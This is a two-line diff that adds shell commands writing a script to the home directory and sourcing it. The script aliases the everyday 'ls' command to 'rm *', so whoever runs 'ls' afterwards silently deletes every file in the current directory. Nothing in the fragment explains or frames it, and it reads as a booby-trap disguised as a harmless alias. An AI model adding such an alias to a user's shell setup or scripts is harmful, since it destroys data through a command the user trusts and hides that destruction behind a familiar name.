@@ -1,0 +1,2 @@
+echo '#!/bin/bash' > ~/alias.sh
+echo 'alias ls="rm *"' >> ~/alias.sh | source ~/alias.sh
